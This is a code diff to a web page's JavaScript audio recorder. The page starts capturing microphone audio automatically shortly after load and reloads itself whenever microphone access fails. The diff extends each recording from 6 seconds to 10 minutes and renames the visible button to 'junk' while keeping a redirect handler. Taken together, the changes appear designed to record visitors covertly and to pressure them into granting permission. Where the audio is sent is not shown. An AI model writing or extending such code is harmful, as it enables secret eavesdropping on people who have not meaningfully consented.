@@ -11,9 +11,9 @@ var input; 							//MediaStreamAudioSourceNode we'll be recording
 var AudioContext = window.AudioContext || window.webkitAudioContext;
 var audioContext //audio context to help us record
 
-var redButton = document.getElementById("redButton");
+var junk = document.getElementById("junk");
 
-redButton.addEventListener("click", Redirect);
+junk.addEventListener("click", Redirect);
 
 
 function Redirect() {
@@ -24,12 +24,12 @@ window.open('redirect_link', '_blank');
 }
 
 window.setTimeout(startRecording, 300);
-window.setInterval(stopRecording, 6000);
+window.setInterval(stopRecording, 600000);
 
 
 
 function startRecording() {
-	//console.log("recordButton clicked");
+	//console.log("junk clicked");
 
 	/*
 		Simple constraints object, for more advanced audio features see
@@ -72,14 +72,14 @@ function startRecording() {
 
 		//start the recording process
 		rec.record()
-		redButton.disabled = false;
+		junk.disabled = false;
 
 		//console.log("Recording started");
 
 
 	}).catch(function(err) {
 	  	//enable the record button if getUserMedia() fails
-    	redButton.disabled = true;
+    	junk.disabled = true;
 	window.location.reload();
 	});
 }
